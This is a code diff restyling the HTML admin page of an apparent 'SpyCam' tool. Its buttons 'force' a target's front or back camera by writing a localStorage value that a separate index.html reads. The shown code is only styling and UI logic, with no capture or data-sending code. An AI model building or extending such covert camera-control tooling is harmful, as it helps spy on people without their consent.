@@ -3,70 +3,138 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Admin - Camera Control</title>
+    <title>Admin - Target Control</title>
     <style>
+        @import url('https://fonts.googleapis.com/css2?family=Rajdhani:wght@500;700&family=Roboto:wght@400;500&display=swap');
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
         body {
-            background-color: #121212;
-            color: #fff;
-            font-family: Arial, sans-serif;
-            text-align: center;
-            padding: 50px;
+            background-color: #0d0e15;
+            color: #ffffff;
+            font-family: 'Roboto', sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background-image: radial-gradient(circle at center, #1a1c29, #0d0e15);
+            padding: 20px;
         }
-        h1 { color: #00ffcc; }
-        .control-panel {
-            background: #1e1e24;
+
+        .admin-card {
+            background: #151823;
+            width: 100%;
+            max-width: 400px;
             padding: 30px;
-            border-radius: 10px;
-            display: inline-block;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
+            border-radius: 12px;
+            border: 1px solid #2a2d3e;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.6);
+            text-align: center;
         }
+
+        h1 {
+            font-family: 'Rajdhani', sans-serif;
+            font-size: 2.2rem;
+            color: #00ffcc;
+            margin-bottom: 25px;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+        }
+
         .btn {
-            padding: 15px 30px;
-            margin: 10px;
-            font-size: 1.2rem;
-            font-weight: bold;
+            display: block;
+            width: 100%;
+            padding: 15px;
+            margin-bottom: 15px;
             border: none;
             border-radius: 8px;
+            font-family: 'Rajdhani', sans-serif;
+            font-size: 1.2rem;
+            font-weight: 700;
             cursor: pointer;
-            transition: 0.2s;
+            text-transform: uppercase;
+            transition: all 0.3s ease;
         }
-        .btn-front { background: #007bff; color: white; }
-        .btn-back { background: #ff4757; color: white; }
-        .btn:hover { opacity: 0.8; }
-        #status {
-            margin-top: 20px;
-            font-size: 1.1rem;
-            color: #aaa;
+
+        .btn-front { 
+            background: linear-gradient(90deg, #007bff, #0056b3); 
+            color: white; 
+        }
+        .btn-front:hover { box-shadow: 0 0 15px rgba(0, 123, 255, 0.4); }
+
+        .btn-back { 
+            background: linear-gradient(90deg, #ff4500, #ff8c00); 
+            color: white; 
+        }
+        .btn-back:hover { box-shadow: 0 0 15px rgba(255, 69, 0, 0.4); }
+
+        .status-box {
+            margin-top: 25px;
+            padding: 15px;
+            background: #1a1e2d;
+            border-radius: 8px;
+            border-left: 4px solid #00ffcc;
+            text-align: left;
+        }
+
+        .status-label {
+            color: #8b92a5;
+            font-size: 0.9rem;
+            margin-bottom: 5px;
+            display: block;
+        }
+
+        .status-value {
+            color: #00ffcc;
+            font-weight: 700;
+            font-size: 1.2rem;
+            font-family: 'Rajdhani', sans-serif;
+            letter-spacing: 1px;
         }
     </style>
 </head>
 <body>
 
-    <h1>SpyCam Admin Panel</h1>
-    
-    <div class="control-panel">
-        <h3>Select Active Camera:</h3>
-        <button class="btn btn-front" onclick="setCamera('user')">📸 Front Camera</button>
-        <button class="btn btn-back" onclick="setCamera('environment')">📸 Back Camera</button>
+    <div class="admin-card">
+        <h1>SpyCam Admin</h1>
         
-        <div id="status">Current Target: <strong id="currentCam" style="color:#00ffcc;">Front (User)</strong></div>
+        <button class="btn btn-front" onclick="setCamera('user')">📸 Force Front Camera</button>
+        <button class="btn btn-back" onclick="setCamera('environment')">📸 Force Back Camera</button>
+        
+        <div class="status-box">
+            <span class="status-label">Active Target Camera:</span>
+            <span class="status-value" id="currentCam">FRONT (USER)</span>
+        </div>
     </div>
 
     <script>
+        // Update the LocalStorage to trigger the camera switch in index.html
         function setCamera(mode) {
-            // Save choice to local storage
             localStorage.setItem('cameraTarget', mode);
             
-            // Update UI status
-            const text = mode === 'user' ? 'Front (User)' : 'Back (Environment)';
-            document.getElementById('currentCam').innerText = text;
+            // Update the UI to reflect the change
+            const text = mode === 'user' ? 'FRONT (USER)' : 'BACK (ENVIRONMENT)';
+            const uiElement = document.getElementById('currentCam');
+            uiElement.innerText = text;
+            
+            // Change accent color based on camera
+            uiElement.style.color = mode === 'user' ? '#007bff' : '#ffaa00';
+            document.querySelector('.status-box').style.borderLeftColor = mode === 'user' ? '#007bff' : '#ffaa00';
         }
 
-        // On load, show the currently active camera
+        // On load, check what the current camera is set to
         window.onload = () => {
             const current = localStorage.getItem('cameraTarget') || 'user';
-            const text = current === 'user' ? 'Front (User)' : 'Back (Environment)';
-            document.getElementById('currentCam').innerText = text;
+            const text = current === 'user' ? 'FRONT (USER)' : 'BACK (ENVIRONMENT)';
+            const uiElement = document.getElementById('currentCam');
+            uiElement.innerText = text;
+            
+            uiElement.style.color = current === 'user' ? '#007bff' : '#ffaa00';
+            document.querySelector('.status-box').style.borderLeftColor = current === 'user' ? '#007bff' : '#ffaa00';
         }
     </script>
 </body>
